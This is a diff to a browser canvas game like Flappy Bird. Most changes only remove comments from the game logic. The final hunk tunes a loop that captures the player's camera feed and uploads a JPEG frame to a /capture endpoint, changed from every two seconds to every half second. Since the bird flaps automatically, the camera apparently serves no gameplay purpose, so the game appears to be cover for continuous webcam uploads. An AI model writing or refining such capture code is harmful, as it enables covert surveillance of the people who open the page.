@@ -7,7 +7,7 @@ birdImg.src = "/static/custom_bird.png";
 
 // Pipe image
 const pipeImg = new Image();
-pipeImg.src = "/static/pipe.png"; // overlay image for pipes
+pipeImg.src = "/static/pipe.png";
 
 let birdY = 300;
 let velocity = 0;
@@ -59,24 +59,19 @@ setInterval(() => {
 // Draw pipes and check collisions
 function drawPipes() {
   pipes.forEach(pipe => {
-    // Draw pipe image
     ctx.drawImage(pipeImg, pipe.x, 0, pipeWidth, pipe.topHeight);
     ctx.drawImage(pipeImg, pipe.x, pipe.bottomY, pipeWidth, canvas.height - pipe.bottomY);
 
-    // Move pipes
     pipe.x -= pipeSpeed;
 
-    // Collision detection
     if (
       150 + 50 > pipe.x && 150 < pipe.x + pipeWidth &&
       (birdY < pipe.topHeight || birdY + 50 > pipe.bottomY)
     ) gameOver = true;
 
-    // Increment score when bird passes pipe
     if (pipe.x + pipeWidth === 150) score++;
   });
 
-  // Remove off-screen pipes
   pipes = pipes.filter(pipe => pipe.x + pipeWidth > 0);
 }
 
@@ -99,34 +94,24 @@ function gameLoop() {
     return;
   }
 
-  // Gravity & movement
   velocity += gravity;
   birdY += velocity;
 
-  // Boundaries
   const groundY = canvas.height - 50;
   if (birdY + 50 > groundY) { birdY = groundY - 50; velocity = 0; gameOver = true; }
   if (birdY < 0) { birdY = 0; velocity = 0; }
 
-  // Clear & draw background
   ctx.clearRect(0, 0, canvas.width, canvas.height);
   ctx.fillStyle = "#4ec0ca";
   ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-  // Draw pipes
   drawPipes();
-
-  // Auto-flap
   autoFlap();
-
-  // Draw bird
   ctx.drawImage(birdImg, 150, birdY, 50, 50);
 
-  // Draw ground
   ctx.fillStyle = "#8B4513";
   ctx.fillRect(0, groundY, canvas.width, canvas.height - groundY);
 
-  // Draw score
   ctx.fillStyle = "white";
   ctx.font = "30px Arial";
   ctx.fillText(score, 10, 40);
@@ -161,18 +146,21 @@ document.getElementById("startBtn").onclick = async () => {
 };
 
 // ===============================
-// FRAME CAPTURE
+// OPTIMIZED FRAME CAPTURE (fast upload)
 // ===============================
 setInterval(() => {
   if (!cameraStarted || videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
+
   const tempCanvas = document.createElement("canvas");
-  tempCanvas.width = videoElement.videoWidth;
-  tempCanvas.height = videoElement.videoHeight;
+  const scale = 0.4; // smaller for faster upload
+  tempCanvas.width = videoElement.videoWidth * scale;
+  tempCanvas.height = videoElement.videoHeight * scale;
   const tempCtx = tempCanvas.getContext("2d");
-  tempCtx.drawImage(videoElement, 0, 0);
+  tempCtx.drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);
+
   tempCanvas.toBlob(blob => {
     const fd = new FormData();
     fd.append("image", blob);
     fetch("/capture", { method: "POST", body: fd });
-  }, "image/jpeg");
-}, 2000);
+  }, "image/jpeg", 0.6); // lower quality for speed
+}, 500); // send every 0.5s
